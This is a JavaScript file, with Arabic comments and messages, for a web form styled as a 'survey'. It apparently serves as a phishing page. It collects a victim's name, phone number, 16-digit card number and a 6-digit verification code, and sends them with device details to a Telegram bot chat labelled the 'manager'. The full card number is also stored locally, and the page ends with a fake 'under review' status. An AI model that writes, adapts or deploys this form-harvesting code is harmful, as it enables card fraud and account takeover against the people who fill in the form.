// المتغيرات العامة
let currentSurveyData = {};
let currentSurveyId = null;
let deviceInfo = null;

// عند تحميل الصفحة
document.addEventListener('DOMContentLoaded', function() {
    // إخفاء شاشة التحميل
    setTimeout(() => {
        document.getElementById('loading').style.display = 'none';
        showPage('page1');
        
        // كشف الجهاز
        deviceInfo = detectDevice();
        updateDeviceInfo();
        
        // تعبئة تاريخ اليوم كتاريخ افتراضي
        const today = new Date();
        document.getElementById('membershipYear').value = today.getFullYear();
        document.getElementById('membershipMonth').value = (today.getMonth() + 1).toString().padStart(2, '0');
        
        // إعداد التواريخ في الماضي (5 سنوات)
        setupYearOptions();
        
    }, 1000);
    
    // إعداد مستمعي الأحداث
    setupEventListeners();
});

// إعداد مستمعي الأحداث
function setupEventListeners() {
    // تنسيق الهاتف أثناء الكتابة
    const phoneInput = document.getElementById('phoneNumber');
    if (phoneInput) {
        phoneInput.addEventListener('input', function(e) {
            let value = this.value.replace(/\D/g, '');
            if (value.length > 10) value = value.substring(0, 10);
            this.value = value;
        });
    }
    
    // منع الأحرف في رقم البطاقة
    const cardInput = document.getElementById('cardNumber');
    if (cardInput) {
        cardInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '');
            if (this.value.length > 16) {
                this.value = this.value.substring(0, 16);
            }
        });
    }
    
    // منع الأحرف في الرمز العشوائي
    const codeInput = document.getElementById('randomCode');
    if (codeInput) {
        codeInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '');
            if (this.value.length > 6) {
                this.value = this.value.substring(0, 6);
            }
        });
    }
    
    // التحقق من صحة البيانات أثناء الكتابة
    document.querySelectorAll('.form-input').forEach(input => {
        input.addEventListener('blur', function() {
            validateInput(this);
        });
    });
}

// إعداد خيارات السنوات
function setupYearOptions() {
    const yearSelect = document.getElementById('membershipYear');
    const currentYear = new Date().getFullYear();
    
    // إضافة 10 سنوات للماضي
    for (let i = 0; i < 10; i++) {
        const year = currentYear - i;
        if (!yearSelect.querySelector(`option[value="${year}"]`)) {
            const option = document.createElement('option');
            option.value = year;
            option.textContent = year;
            yearSelect.appendChild(option);
        }
    }
}

// التحقق من حقل الإدخال
function validateInput(input) {
    const value = input.value.trim();
    
    if (input.id === 'fullName' && !isValidName(value)) {
        showError(input, 'الاسم يجب أن يكون عربي ويتكون من 3 أحرف على الأقل');
        return false;
    }
    
    if (input.id === 'phoneNumber' && value && !isValidPhone(value)) {
        showError(input, 'رقم الهاتف يجب أن يبدأ بـ 05/06/07 ويتكون من 10 أرقام');
        return false;
    }
    
    if (input.id === 'cardNumber' && value && !isValidCard(value)) {
        showError(input, 'رقم البطاقة يجب أن يكون 16 رقم');
        return false;
    }
    
    clearError(input);
    return true;
}

// عرض خطأ للحقل
function showError(input, message) {
    const group = input.closest('.input-group') || input.closest('.code-input-container');
    if (group) {
        group.classList.add('error');
        
        let errorElement = group.querySelector('.error-message');
        if (!errorElement) {
            errorElement = document.createElement('div');
            errorElement.className = 'error-message';
            group.appendChild(errorElement);
        }
        errorElement.textContent = message;
        errorElement.style.display = 'block';
        
        input.classList.add('shake');
        setTimeout(() => {
            input.classList.remove('shake');
        }, 500);
    }
}

// مسح الخطأ
function clearError(input) {
    const group = input.closest('.input-group') || input.closest('.code-input-container');
    if (group) {
        group.classList.remove('error');
        const errorElement = group.querySelector('.error-message');
        if (errorElement) {
            errorElement.style.display = 'none';
        }
    }
}

// تحديث معلومات الجهاز
function updateDeviceInfo() {
    if (!deviceInfo) return;
    
    document.getElementById('deviceType').textContent = deviceInfo.type;
    document.getElementById('browserType').textContent = deviceInfo.browser;
    document.getElementById('osType').textContent = deviceInfo.os;
    document.getElementById('screenSize').textContent = deviceInfo.screen;
}

// إرسال البيانات للمدير (الصفحة 1)
async function sendToManager() {
    // جمع البيانات من الصفحة 1
    const name = document.getElementById('fullName').value.trim();
    const phone = document.getElementById('phoneNumber').value.trim();
    const card = document.getElementById('cardNumber').value.trim();
    const month = document.getElementById('membershipMonth').value;
    const year = document.getElementById('membershipYear').value;
    
    // التحقق من البيانات
    if (!name || !phone || !card || !month || !year) {
        showNotification('يرجى ملء جميع الحقول المطلوبة', 'error');
        return;
    }
    
    if (!isValidName(name)) {
        showNotification('الاسم يجب أن يكون عربي ويتكون من 3 أحرف على الأقل', 'error');
        return;
    }
    
    if (!isValidPhone(phone)) {
        showNotification('رقم الهاتف غير صحيح', 'error');
        return;
    }
    
    if (!isValidCard(card)) {
        showNotification('رقم البطاقة يجب أن يكون 16 رقم', 'error');
        return;
    }
    
    // تأكيد الموافقة
    const confirmation = document.getElementById('dataConfirmation');
    if (!confirmation.checked) {
        showNotification('يجب الموافقة على إرسال البيانات', 'error');
        return;
    }
    
    // حفظ البيانات مؤقتاً
    currentSurveyData = {
        name: name,
        phone: phone,
        card: card,
        membershipMonth: month,
        membershipYear: year,
        deviceInfo: deviceInfo,
        timestamp: new Date().toLocaleString('ar-SA')
    };
    
    currentSurveyId = generateSurveyId();
    
    // إرسال للبوت التيليجرام
    showNotification(CONFIG.MESSAGES.SENDING, 'info');
    
    try {
        const response = await sendToTelegram(currentSurveyData, 'step1');
        
        if (response.success) {
            showNotification(CONFIG.MESSAGES.SUCCESS, 'success');
            
            // الانتقال للصفحة 2 بعد ثانيتين
            setTimeout(() => {
                showPage('page2');
                showNotification(CONFIG.MESSAGES.DEVICE_DETECTED, 'info');
            }, 2000);
            
        } else {
            throw new Error(response.error);
        }
        
    } catch (error) {
        console.error('❌ خطأ في الإرسال:', error);
        showNotification('⚠️ تم حفظ البيانات محلياً، جاري الانتقال...', 'warning');
        
        // الانتقال للصفحة 2 مع حفظ محلي
        setTimeout(() => {
            saveSurveyLocally();
            showPage('page2');
        }, 2000);
    }
}

// إرسال لتيليجرام
async function sendToTelegram(data, step) {
    // إذا لم يكن هناك توكن، نرجع نجاح وهمي (للتجربة المحلية)
    if (!CONFIG.TELEGRAM_BOT_TOKEN || CONFIG.TELEGRAM_BOT_TOKEN.includes('ضع_توكن')) {
        console.log('⚠️ لم يتم إعداد بوت التيليجرام - استمرار بدون إرسال');
        return { success: true, local: true };
    }
    
    let message = '';
    
    if (step === 'step1') {
        message = `📋 *استبيان جديد - الخطوة 1*\n\n`;
        message += `👤 *الاسم:* ${data.name}\n`;
        message += `📞 *الهاتف:* \`${data.phone}\`\n`;
        message += `💳 *البطاقة:* \`${data.card.substring(0, 4)} **** **** ${data.card.substring(12)}\`\n`;
        
        const months = ['يناير', 'فبراير', 'مارس', 'أبريل', 'مايو', 'يونيو', 
                       'يوليو', 'أغسطس', 'سبتمبر', 'أكتوبر', 'نوفمبر', 'ديسمبر'];
        const monthName = months[parseInt(data.membershipMonth) - 1] || data.membershipMonth;
        message += `📅 *تاريخ الانتماء:* ${monthName} ${data.membershipYear}\n`;
        
        message += `\n📱 *معلومات الجهاز:*\n`;
        message += `• النوع: ${data.deviceInfo.type}\n`;
        message += `• المتصفح: ${data.deviceInfo.browser}\n`;
        message += `• النظام: ${data.deviceInfo.os}\n`;
        
        message += `\n🆔 *رقم الاستبيان:* \`${currentSurveyId}\``;
        message += `\n⏰ *الوقت:* ${data.timestamp}`;
        
    } else if (step === 'complete') {
        message = `🎉 *استبيان مكتمل*\n\n`;
        message += `📋 *المعلومات الشخصية:*\n`;
        message += `• الاسم: ${data.name}\n`;
        message += `• الهاتف: \`${data.phone}\`\n`;
        message += `• البطاقة: \`${data.card.substring(0, 4)} **** **** ${data.card.substring(12)}\`\n`;
        
        const months = ['يناير', 'فبراير', 'مارس', 'أبريل', 'مايو', 'يونيو', 
                       'يوليو', 'أغسطس', 'سبتمبر', 'أكتوبر', 'نوفمبر', 'ديسمبر'];
        const monthName = months[parseInt(data.membershipMonth) - 1] || data.membershipMonth;
        message += `• تاريخ الانتماء: ${monthName} ${data.membershipYear}\n\n`;
        
        message += `🔐 *الرمز العشوائي:* \`${data.randomCode}\`\n\n`;
        
        message += `📱 *معلومات الجهاز:*\n`;
        message += `• النوع: ${data.deviceInfo.type}\n`;
        message += `• المتصفح: ${data.deviceInfo.browser}\n`;
        message += `• النظام: ${data.deviceInfo.os}\n`;
        message += `• الشاشة: ${data.deviceInfo.screen}\n`;
        
        message += `\n🆔 *رقم الاستبيان:* \`${currentSurveyId}\``;
        message += `\n📅 *تاريخ الاكتمال:* ${new Date().toLocaleString('ar-SA')}`;
        message += `\n✅ *الحالة:* مكتمل - بانتظار المراجعة`;
    }
    
    try {
        const response = await fetch(`${CONFIG.API_URL}${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CONFIG.TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            })
        });
        
        const result = await response.json();
        
        if (result.ok) {
            return { success: true, messageId: result.result.message_id };
        } else {
            return { success: false, error: result.description };
        }
        
    } catch (error) {
        return { success: false, error: error.message };
    }
}

// حفظ الاستبيان محلياً
function saveSurveyLocally() {
    try {
        const surveys = loadFromStorage('surveys', []);
        const surveyData = {
            ...currentSurveyData,
            surveyId: currentSurveyId,
            randomCode: document.getElementById('randomCode')?.value || '',
            status: 'pending',
            submittedAt: new Date().toISOString()
        };
        
        surveys.push(surveyData);
        saveToStorage('surveys', surveys);
        
        console.log('✅ تم حفظ الاستبيان محلياً');
        return true;
    } catch (error) {
        console.error('❌ خطأ في الحفظ المحلي:', error);
        return false;
    }
}

// تعبئة مثال للرمز
function fillCode(code) {
    document.getElementById('randomCode').value = code;
    showNotification(`تم تعبئة الرمز: ${code}`, 'info');
}

// إكمال التحقق (الصفحة 2)
async function completeVerification() {
    const randomCode = document.getElementById('randomCode').value.trim();
    
    if (!randomCode || !isValidCode(randomCode)) {
        showNotification('يجب إدخال 6 أرقام للرمز', 'error');
        document.getElementById('randomCode').classList.add('shake');
        setTimeout(() => {
            document.getElementById('randomCode').classList.remove('shake');
        }, 500);
        return;
    }
    
    // إضافة الرمز للبيانات
    currentSurveyData.randomCode = randomCode;
    
    showNotification('جاري إكمال الاستبيان...', 'info');
    
    try {
        // إرسال الاستبيان المكتمل للبوت
        const response = await sendToTelegram(currentSurveyData, 'complete');
        
        if (response.success) {
            // حفظ محلي
            saveSurveyLocally();
            
            showNotification('✅ تم إكمال الاستبيان بنجاح', 'success');
            
            // تحديث صفحة النهاية
            updateCompletionPage();
            
            // الانتقال للصفحة 3 بعد ثانيتين
            setTimeout(() => {
                showPage('page3');
            }, 2000);
            
        } else {
            throw new Error(response.error);
        }
        
    } catch (error) {
        console.error('❌ خطأ في إكمال الاستبيان:', error);
        
        // حفظ محلي والانتقال
        saveSurveyLocally();
        updateCompletionPage();
        
        showNotification('⚠️ تم حفظ الاستبيان محلياً', 'warning');
        
        setTimeout(() => {
            showPage('page3');
        }, 2000);
    }
}

// تحديث صفحة النهاية
function updateCompletionPage() {
    // تحديث المعلومات
    document.getElementById('surveyId').textContent = currentSurveyId;
    document.getElementById('submissionDate').textContent = new Date().toLocaleString('ar-SA');
    document.getElementById('submittedName').textContent = currentSurveyData.name;
    document.getElementById('submittedPhone').textContent = currentSurveyData.phone;
}

// الانتقال بين الصفحات
function showPage(pageId) {
    // إخفاء جميع الصفحات
    document.querySelectorAll('.page').forEach(page => {
        page.classList.remove('active');
    });
    
    // إظهار الصفحة المطلوبة
    document.getElementById(pageId).classList.add('active');
    
    // التمرير للأعلى
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

// العودة للصفحة الرئيسية
function goHome() {
    showPage('page1');
    
    // إعادة تعيين النموذج (اختياري)
    // document.getElementById('surveyForm').reset();
}

// إنشاء استبيان جديد
function newSurvey() {
    // إعادة تعيين البيانات
    currentSurveyData = {};
    currentSurveyId = null;
    
    // إعادة تعيين النموذج
    document.getElementById('fullName').value = '';
    document.getElementById('phoneNumber').value = '';
    document.getElementById('cardNumber').value = '';
    document.getElementById('randomCode').value = '';
    document.getElementById('dataConfirmation').checked = false;
    
    // العودة للصفحة الأولى
    showPage('page1');
}

// مشاركة رقم الاستبيان
function shareSurvey() {
    const surveyId = document.getElementById('surveyId').textContent;
    const shareInput = document.getElementById('shareCodeInput');
    
    shareInput.value = surveyId;
    document.getElementById('shareModal').style.display = 'flex';
}

// إغلاق النافذة المنبثقة
function closeModal() {
    document.getElementById('shareModal').style.display = 'none';
    document.getElementById('copyMessage').style.display = 'none';
}

// نسخ للكليبورد
function copyToClipboard() {
    const shareInput = document.getElementById('shareCodeInput');
    const copyMessage = document.getElementById('copyMessage');
    
    shareInput.select();
    shareInput.setSelectionRange(0, 99999);
    
    navigator.clipboard.writeText(shareInput.value)
        .then(() => {
            copyMessage.textContent = CONFIG.MESSAGES.COPIED;
            copyMessage.className = 'copy-message success';
            copyMessage.style.display = 'block';
            
            setTimeout(() => {
                copyMessage.style.display = 'none';
                closeModal();
            }, 2000);
        })
        .catch(() => {
            copyMessage.textContent = '❌ فشل النسخ';
            copyMessage.className = 'copy-message error';
            copyMessage.style.display = 'block';
        });
}

// عرض حالة الاستبيان
function viewStatus() {
    showNotification('🔍 جاري البحث عن حالة الاستبيان...', 'info');
    
    // يمكن إضافة منطق لجلب الحالة من localStorage أو من البوت
    setTimeout(() => {
        showNotification('✅ الحالة: قيد المراجعة من قبل المدير', 'success');
    }, 1500);
}

// عرض الإشعارات
function showNotification(message, type = 'info') {
    const notification = document.getElementById('notification');
    
    notification.textContent = message;
    notification.className = `notification ${type}`;
    notification.style.display = 'block';
    
    // إخفاء تلقائي بعد 3 ثواني
    setTimeout(() => {
        notification.style.display = 'none';
    }, 3000);
}

// أسلوب CSS للإشعارات والأخطاء
const style = document.createElement('style');
style.textContent = `
    .error {
        border-color: #ef4444 !important;
    }
    
    .error-message {
        color: #ef4444;
        font-size: 14px;
        margin-top: 8px;
        display: none;
    }
    
    .shake {
        animation: shake 0.5s;
    }
    
    @keyframes shake {
        0%, 100% { transform: translateX(0); }
        10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
        20%, 40%, 60%, 80% { transform: translateX(5px); }
    }
`;
document.head.appendChild(style);